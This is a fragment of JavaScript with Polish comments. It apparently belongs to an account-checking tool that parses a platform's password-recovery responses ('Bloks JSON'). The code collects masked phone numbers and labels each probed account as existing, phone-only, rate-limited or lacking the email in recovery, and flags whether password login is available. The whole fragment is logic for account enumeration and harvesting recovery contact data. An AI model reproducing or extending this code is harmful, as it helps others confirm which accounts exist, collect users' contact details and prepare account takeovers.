    out.emailFound = recovery.emailFound;

    // FALLBACK: harvester na surowym recoveryRaw (sparsowany Bloks JSON) — uzupełnia
    // phones gdyby parseAuthOptions pominął jakiś nietypowy wariant maskowania.
    try {
        if (recoveryRaw) {
            for (const ph of harvestPhones(recoveryRaw)) {
                if (!out.phones.includes(ph)) out.phones.push(ph);
            }
        }
    } catch { }

    // Klasyfikacja active:
    //   'yes'        - jest opcja hasla (mozna sie zalogowac haslem -> konto pelnoaktywne)
    //   'phone_only' - tylko numer telefonu w recovery, brak hasla i brak emaili
    //   'no'         - inne (sam email recovery / inne kombinacje)
    if (recovery.hasPassword) out.active = 'yes';
    else if (recovery.phones.length > 0 && recovery.emails.length === 0) out.active = 'phone_only';
    else out.active = 'no';

    if (!recovery.emailFound && recovery.emails.length === 0 && recovery.phones.length === 0 && !recovery.hasPassword) {
        if (sr.accountType || sr.nextScreen === 'code_entry' || sr.nextScreen === 'auth_method') {
            out.decision = 'exists';
            out.codeLen = '6';
            out.detail = `bloks:exists_no_recovery_options(type=${sr.accountType || '?'},next=${sr.nextScreen || '-'})`;
            return out;
        }
        out.decision = 'rate_limited'; out.detail = `bloks:no_channels(${recoveryFromAppid})`; return out;
    }
    if (!recovery.emailFound && recovery.emails.length === 0 && recovery.phones.length === 0 && recovery.hasPassword) {
        out.decision = 'ambiguous'; out.detail = `bloks:channels_encrypted(${recoveryFromAppid})`; return out;
    }
    if (!recovery.emailFound) {
        out.decision = 'bad_email_recovery'; out.detail = `bloks:email_not_in_recovery(${recoveryFromAppid})`; return out;
    }

    out.decision = 'exists';
    out.detail = `bloks:ok(${recoveryFromAppid})`;
    out.codeLen = '6';

    return out;
}
